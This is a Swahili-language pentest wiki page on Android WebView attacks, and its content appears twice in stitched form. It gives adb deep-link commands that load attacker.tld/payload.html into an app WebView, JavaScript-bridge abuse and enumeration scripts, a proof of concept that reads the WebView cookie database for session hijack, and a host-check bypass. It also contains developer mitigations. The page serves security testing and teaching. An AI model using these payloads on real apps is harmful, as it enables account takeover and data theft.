# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Mwongozo juu ya Mipangilio ya WebView na Usalama

### Muhtasari wa Udhaifu wa WebView

Sehemu muhimu ya maendeleo ya Android ni utunzaji sahihi wa WebViews. Mwongozo huu unaangazia mipangilio muhimu na mbinu za usalama ili kupunguza hatari zinazohusiana na matumizi ya WebView.

![WebView Example](<../../images/image (1190).png>)

### **Ufikiaji wa Faili katika WebViews**

Kwa kawaida, WebViews huruhusu ufikiaji wa faili. Kazi hii inadhibitiwa na `setAllowFileAccess()` method, inayopatikana tangu Android API level 3 (Cupcake 1.5). Programu zilizo na ruhusa **android.permission.READ_EXTERNAL_STORAGE** zinaweza kusoma faili kutoka storage ya nje kwa kutumia file URL scheme (`file://path/to/file`).

#### **Vipengele Vilivyopitwa na Wakati: Universal and File Access From URLs**

- **Universal Access From File URLs**: Kipengele hiki kilichopitwa na wakati kiliruhusu maombi ya cross-origin kutoka file URLs, kikisababisha hatari kubwa ya usalama kutokana na uwezekano wa XSS attacks. Mipangilio ya default imezimwa (`false`) kwa apps zinazolenga Android Jelly Bean na baadaye.
- Kuangalia mipangilio hii, tumia `getAllowUniversalAccessFromFileURLs()`.
- Kubadilisha mipangilio hii, tumia `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Kipengele hiki, pia kilichopitwa na wakati, kilidhibiti ufikiaji wa maudhui kutoka URL nyingine za file scheme. Kama universal access, default yake imezimwa kwa usalama ulioimarishwa.
- Tumia `getAllowFileAccessFromFileURLs()` kuangalia na `setAllowFileAccessFromFileURLs(boolean)` kuweka.

#### **Kupakia Faili kwa Usalama**

Ili kuzima ufikiaji wa file system huku bado ukipata assets na resources, method `setAllowFileAccess()` inatumiwa. Kwa Android R na juu, default ni `false`.

- Angalia kwa `getAllowFileAccess()`.
- Washa au zima kwa `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Class **WebViewAssetLoader** ni mbinu ya kisasa ya kupakia faili za ndani. Inatumia http(s) URLs kwa kupata assets na resources za ndani, ikifuata Same-Origin policy, na hivyo kurahisisha usimamizi wa CORS.

### loadUrl

Hii ni function inayotumika kwa kawaida kupakia URLs yoyote katika WebView:
```java
webview.loadUrl("<url here>")
```
Bila shaka, mshambuliaji anayeweza kamwe asipaswe kuwa na uwezo wa **kudhibiti URL** ambayo programu itapakia.

### **Utunzaji wa JavaScript na Intent Scheme**

- **JavaScript**: Imezimwa kwa chaguo-msingi katika WebViews, inaweza kuwezeshwa kwa `setJavaScriptEnabled()`. Tahadhari inashauriwa kwani kuwezesha JavaScript bila kinga stahiki kunaweza kuleta udhaifu wa usalama.
- **Intent Scheme**: WebViews zinaweza kushughulikia `intent` scheme, jambo ambalo linaweza kusababisha exploits ikiwa halitatunzwa kwa uangalifu. Mfano wa udhaifu ulihusisha parameter ya WebView "support_url" iliyo wazi ambayo ilingeweza kutumiwa kutekeleza cross-site scripting (XSS) attacks.

![WebView yenye udhaifu](<../../images/image (1191).png>)

Mfano wa exploitation ukitumia adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Kipengele kinatolewa na Android kinachoruhusu **JavaScript** ndani ya WebView kuita **kazi za asili za programu za Android**. Hii inafikiwa kwa kutumia njia ya `addJavascriptInterface`, ambayo inaunganisha JavaScript na uwezo asilia wa Android, inayoitwa _WebView JavaScript bridge_. Tahadhari inashauriwa kwa sababu njia hii inaruhusu kurasa zote ndani ya WebView kufikia JavaScript Interface object iliyosajiliwa, ikileta hatari ya usalama endapo taarifa nyeti zitafunuliwa kupitia interface hizi.

- **Tahadhari kali inahitajika** kwa apps zinazolenga matoleo ya Android chini ya 4.2 kutokana na udhaifu unaoruhusu remote code execution kupitia malicious JavaScript, ukitumia reflection.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** zinaweza kuingiliana na native code, kama inavyoonyeshwa katika mifano ambapo method ya class inafunguliwa kwa JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge inawashwa kwa kuongeza interface kwenye WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Uwezekano wa kutumiwa vibaya kupitia JavaScript, kwa mfano kupitia XSS attack, unawezesha kuita Java methods zilizo wazi:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Ili kupunguza hatari, **kizuia matumizi ya JavaScript bridge** kwa code iliyotumwa na APK na zuia kupakia JavaScript kutoka kwa vyanzo vya mbali. Kwa vifaa vya zamani, weka minimum API level kuwa 17.

### Reflection-based Remote Code Execution (RCE)

- Njia iliyofanyika kama nyaraka inaruhusu kufikia RCE kupitia reflection kwa kutekeleza payload maalum. Hata hivyo, annotation ya `@JavascriptInterface` inazuia ufikiaji wa method zisizoidhinishwa, ikipunguza attack surface.

### Remote Debugging

- **Remote debugging** inawezekana kwa kutumia **Chrome Developer Tools**, ikiruhusu mwingiliano na utekaji wa JavaScript yoyote ndani ya yaliyomo ya WebView.

#### Enabling Remote Debugging

- Remote debugging inaweza kuamilishwa kwa WebViews zote ndani ya app kwa:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Ili kuwezesha debugging kwa sharti kulingana na debuggable state ya programu:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate faili yoyote

- Inaonyesha exfiltration ya faili yoyote kwa kutumia XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Attacks



## Mwongozo wa Mipangilio ya WebView na Usalama

### Muhtasari wa Udhaifu wa WebView

Sehemu muhimu ya maendeleo ya Android ni utunzaji sahihi wa WebViews. Mwongozo huu unaangazia mipangilio muhimu na mbinu za usalama za kupunguza hatari zinazohusiana na matumizi ya WebView.

![WebView Example](<../../images/image (1190).png>)

### **Kufikia Faili katika WebViews**

Kwa chaguo-msingi, WebViews huruhusu kufikia faili. Uwezo huu unadhibitiwa na method `setAllowFileAccess()`, inayoonekana tangu Android API level 3 (Cupcake 1.5). Programu zilizo na ruhusa **android.permission.READ_EXTERNAL_STORAGE** zinaweza kusoma faili kutoka external storage kwa kutumia file URL scheme (`file://path/to/file`).

#### **Vipengele Vilivyokataliwa: Universal and File Access From URLs**

- **Universal Access From File URLs**: Kipengele hicho kilichokataliwa kiliruhusu cross-origin requests kutoka file URLs, na hivyo kuleta hatari kubwa ya usalama kutokana na uwezekano wa XSS. Mipangilio ya chaguo-msingi imezimwa (`false`) kwa apps zinazolenga Android Jelly Bean na za baadaye.
- To check this setting, use `getAllowUniversalAccessFromFileURLs()`.
- To modify this setting, use `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Kipengele hiki, pia kilichokataliwa, kilidhibiti upatikanaji wa maudhui kutoka kwa URL nyingine za scheme ya file. Kama universal access, chaguo-msingi chake kimezimwa kwa usalama ulioboreshwa.
- Use `getAllowFileAccessFromFileURLs()` to check and `setAllowFileAccessFromFileURLs(boolean)` to set.

#### **Kupakia Faili kwa Usalama**

Ili kuzima ufikaji wa mfumo wa faili huku ukibaki na uwezo wa kufikia assets na resources, method `setAllowFileAccess()` inatumika. Kwa Android R na juu yake, chaguo-msingi ni `false`.

- Check with `getAllowFileAccess()`.
- Enable or disable with `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Darasa la **WebViewAssetLoader** ni njia ya kisasa ya kupakia faili za ndani. Linatumia http(s) URLs kupata assets na resources za ndani, likifuata Same-Origin policy, hivyo kurahisisha usimamizi wa CORS.

### loadUrl

Hii ni kazi ya kawaida inayotumika kupakia URL yoyote katika WebView:
```java
webview.loadUrl("<url here>")
```
Bila shaka, mshambuliaji haipaswi kamwe kuweza **kudhibiti URL** ambayo programu itapakia.

### Deep-linking katika WebView ya ndani (custom scheme → WebView sink)

Programu nyingi husajili custom schemes/paths ambazo zinaelekeza user-supplied URL katika in-app WebView. Ikiwa deep link ime-exported (VIEW + BROWSABLE), mshambuliaji anaweza kulazimisha programu kuonyesha arbitrary remote content ndani ya muktadha wake wa WebView.

Typical manifest pattern (simplified):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Mtiririko wa kawaida wa msimbo (uliorahisishwa):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Mfano wa shambulio na PoC kupitia adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Athari: ukurasa wa mbali unaendeshwa katika muktadha wa app WebView (cookies/session ya profaili ya app WebView, upatikanaji wa @JavascriptInterface yoyote iliyofichuliwa, upatikanaji wa content:// na file:// kulingana na mipangilio).

Hunting tips:
- Grep vyanzo vilivyofinyangwa kwa `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, na deep-link handlers (`onCreate/onNewIntent`).
- Kagua manifest kwa filtres za VIEW+BROWSABLE na custom schemes/hosts ambazo zinaelekeza kwenye activities ambazo baadaye zinaanza WebView.
- Angalia kama kuna njia nyingi za deep-link (mfano, njia ya “external browser” dhidi ya njia ya “internal webview”) na pendelea ile inayotoa render ndani ya app.

### Kuwawezesha JavaScript kabla ya uthibitisho (order-of-checks bug)

Kosa la kawaida la hardening ni kuwezesha JavaScript au kusanidi mipangilio ya WebView kwa ustahimilivu kabla ya orodha ya kuruhusiwa/uthibitisho wa URL lengwa kukamilika. Ikiwa uthibitisho hauendani miongoni mwa helpers au unafanyika kuchelewa mno, deep link ya mshambuliaji inaweza kufikia hali ambapo:

1) Mipangilio ya WebView inatumika (mf., `setJavaScriptEnabled(true)`), na
2) URL isiyo ya kuaminika inapakiwa ikiwa JavaScript imewezeshwa.

Bug pattern (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Kwa nini inaweza kutumika
- Normalizasho isiyotegemewa: vitendea kazi vya kusaidia hugawanya/kujenga upya URL kwa njia tofauti kuliko ukaguzi wa mwisho, na kuunda utofauti ambao URL ya uovu inaweza kutumia.
- Mpangilio wa mchakato uliopangwa vibaya: kuwezesha JS katika hatua ya 2 kunatumika kwa ujumla kwa instance ya WebView, na kuathiri upakiaji wa mwisho hata kama uidhinishaji utashindwa baadaye.

Jinsi ya kujaribu
- Tengeneza deep-link payloads ambazo zinapita ukaguzi wa awali na kufikia tovuti ya usanidi wa WebView.
- Tumia adb kutuma implicit VIEW intents zinazowasilisha parameter `url=` unaodhibiti:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Ikiwa exploitation inafanikiwa, payload yako inaendesha JavaScript katika WebView ya app. Kutoka hapo, chunguza exposed bridges:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Mwongozo wa Ulinzi
- Fanya canonicalization mara moja; thibitisha kwa ukali dhidi ya chanzo kimoja cha ukweli (scheme/host/path/query).
- Wito kwa `setJavaScriptEnabled(true)` ufanywe tu baada ya ukaguzi wote wa allowlist kupitishwa na mara tu kabla ya kupakia maudhui ya kuaminika.
- Epuka kufichua `@JavascriptInterface` kwa origins zisizoaminika; tumia per-origin gating.
- Fikiria per-WebView instances kwa maudhui ya kuaminika vs yasiyoaminika, na JS imezimwa kwa chaguo-msingi.

### **JavaScript na Intent Scheme Usimamizi**

- **JavaScript**: Imezimwa kwa chaguo-msingi katika WebViews; inaweza kuwezeshwa kupitia `setJavaScriptEnabled()`. Tahadhari inashauriwa kwani kuwezesha JavaScript bila kinga zinazofaa kunaweza kuleta udhaifu wa usalama.
- **Intent Scheme**: WebViews zinaweza kushughulikia scheme ya `intent`, ambayo inaweza kusababisha exploits kama hazitashughulikiwa kwa uangalifu. Mfano wa udhaifu ulihusisha parameter ya WebView iliyofichuliwa "support_url" ambayo ingeweza kutumika kutekeleza cross-site scripting (XSS) attacks.

![Vulnerable WebView](<../../images/image (1191).png>)

Mfano wa exploitation ukitumia adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android inatoa kipengele kinachowezesha **JavaScript** ndani ya WebView kuitisha **native Android app functions**. Hili hufikiwa kwa kutumia njia `addJavascriptInterface`, ambayo inaunganisha JavaScript na functionalities za asili za Android, zinazojulikana kama _WebView JavaScript bridge_. Tahadhari inashauriwa kwa sababu njia hii inaruhusu kurasa zote ndani ya WebView kufikia JavaScript Interface iliyosajiliwa, ikileta hatari ya usalama ikiwa taarifa nyeti zitaonekana kupitia interfaces hizi.

- **Tahadhari kubwa inahitajika** kwa programu zinazolenga toleo la Android chini ya 4.2 kutokana na udhaifu unaoruhusu remote code execution kupitia JavaScript yenye madhara, ukitumia reflection.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** zinaweza kuingiliana na native code, kama inavyoonyeshwa kwenye mifano ambapo class method imefunuliwa kwa JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge inawezeshwa kwa kuongeza interface kwenye WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Uwezekano wa kutumiwa kupitia JavaScript, kwa mfano, kupitia shambulio la XSS, unaruhusu kuitwa kwa methods za Java zilizo wazi:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Kupunguza hatari, **restrict JavaScript bridge usage** kwa code iliyosambazwa na APK na zuia kuingiza JavaScript kutoka vyanzo vya mbali. Kwa vifaa vya zamani, weka kiwango cha chini cha API kuwa 17.

#### Kutumia vibaya dispatcher-style JS bridges (invokeMethod/handlerName)

Mfano wa kawaida ni method moja iliyotolewa (mfano, `@JavascriptInterface void invokeMethod(String json)`) ambayo inafanya deserialization ya JSON inayodhibitiwa na mshambuliaji kuwa object ya jumla na kuendesha kitendo kulingana na handler name iliyotolewa. Muundo wa kawaida wa JSON:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Hatari: ikiwa handler yoyote ilyosajiliwa inafanya vitendo vyenye ruhusa juu ya data ya mshambuliaji (mfano, direct file reads), unaweza kuitisha kwa kuweka `handlerName` ipasavyo. Matokeo mara nyingi hurejeshwa ndani ya muktadha wa ukurasa kupitia `evaluateJavascript` na utaratibu wa callback/promise unaofungamana kwa `callbackId`.

Key hunting steps
- Decompile and grep for `addJavascriptInterface(` to learn the bridge object name (e.g., `xbridge`).
- In Chrome DevTools (chrome://inspect), type the bridge object name in the Console (e.g., `xbridge`) to enumerate exposed fields/methods; look for a generic dispatcher like `invokeMethod`.
- Enumerate handlers by searching for classes implementing `getModuleName()` or registration maps.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

If a handler takes a URI, calls `Uri.parse(req.getUri()).getPath()`, builds `new File(...)` and reads it without allowlists or sandbox checks, you get an arbitrary file read in the app sandbox that bypasses WebView settings like `setAllowFileAccess(false)` (the read happens in native code, not via the WebView network stack).

PoC to exfiltrate the Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Vidokezo
- Cookie DB paths zinatofautiana kati ya vifaa/watoa huduma. Zilizo za kawaida:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- Handler hurudisha Base64; undecoded ili kupata cookies na kuiga mtumiaji kwenye profaili ya WebView ya app.

Vidokezo vya utambuzi
- Angalia mfululizo mkubwa wa Base64 unaorudishwa kupitia `evaluateJavascript` unapotumia app.
- Tumia Grep kwenye vyanzo vilivyodecompiled kutafuta handlers zinazokubali `uri`/`path` na kuzibadilisha kuwa `new File(...)`.

#### Kupita vizingiti vya ruhusa vya WebView – endsWith() host checks

Maamuzi ya ruhusa (kuchagua Activity yenye JSB) mara nyingi hutegemea host allowlists. Mfano wenye mende ni:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Mantiki sawa (Kanuni za De Morgan):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Hii sio origin check. Hosts nyingi zisizokusudiwa zinaweza kutimiza kifungu cha pili, zikiruhusu domains zisizoaminifu kuingia kwenye privileged Activity. Daima thibitisha scheme na host dhidi ya strict allowlist (exact match au correct subdomain check with dot-boundaries), sio `endsWith` tricks.

#### javascript:// execution primitive via loadUrl

Mara tu ndani ya privileged WebView, apps wakati mwingine hutekeleza inline JS kupitia:
```java
webView.loadUrl("javascript:" + jsPayload);
```
Ikiwa mtiririko wa ndani unasababisha `loadUrl("javascript:...")` katika muktadha huo, JS iliyowekwa itaendeshwa ikiwa na ufikiaji wa bridge hata kama ukurasa wa nje kwa kawaida usingehuruhusiwa. Pentest steps:
- Tumia grep kutafuta `loadUrl("javascript:` na `evaluateJavascript(` katika app.
- Jaribu kufikia njia hizo za code baada ya kulazimisha urambazaji kwenda kwa privileged WebView (kwa mfano, via a permissive deep link chooser).
- Tumia primitive kupiga dispatcher (`xbridge.invokeMethod(...)`) na kufikia sensitive handlers.

Mitigations (developer checklist)
- Strict origin verification for privileged Activities: canonicalize na linganisha scheme/host dhidi ya allowlist wazi; epuka ukaguzi unaotegemea `endsWith`. Consider Digital Asset Links inapofaa.
- Scope bridges to trusted pages only na rudisha uhakiki wa uaminifu kwa kila call (per-call authorization).
- Ondoa au linda vikali filesystem-capable handlers; tercih `content://` na allowlists/permissions badala ya raw `file://` paths.
- Epuka `loadUrl("javascript:")` katika privileged contexts au iweke nyuma ya strong checks.
- Kumbuka `setAllowFileAccess(false)` hailindi dhidi ya native file reads kupitia bridge.

#### JSB enumeration na vidokezo vya debugging

- Wezesha WebView remote debugging ili kutumia Chrome DevTools Console:
- App-side (debug builds): `WebView.setWebContentsDebuggingEnabled(true)`
- System-side: modules kama [LSPosed](https://github.com/LSPosed/LSPosed) au Frida scripts zinaweza force-enable debugging hata katika release builds. Mfano wa Frida snippet kwa Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- Katika DevTools, andika jina la bridge object (mfano, `xbridge`) kuona exposed members na kuchunguza dispatcher.


### Reflection-based Remote Code Execution (RCE)

- Njia iliyodokumentiwa inaruhusu kufikia RCE kupitia reflection kwa kutekeleza payload maalum. Hata hivyo, annotation `@JavascriptInterface` inazuia ufikiaji wa njia zisizoruhusiwa, ikipunguza attack surface.

### Remote Debugging

- **Remote debugging** inawezekana kwa kutumia **Chrome Developer Tools**, ikiwezesha mwingiliano na utekelezaji wowote wa JavaScript ndani ya maudhui ya WebView.

#### Kuwezesha Remote Debugging

- Remote debugging inaweza kuwezeshwa kwa WebViews zote ndani ya application kwa:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Ili kuwezesha debugging kwa masharti kulingana na ikiwa programu iko katika hali ya 'debuggable':
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate faili yoyote

- Inaonyesha exfiltration ya faili yoyote kwa kutumia XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Marejeo

- [Mapitio ya Android WebViews file access attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (app ya demo)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Marejeo ya Android WebView](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Sehemu II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Sehemu I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Mwongozo](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Video ya maonyesho](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Account takeover in Android app via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – wezesha WebView debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
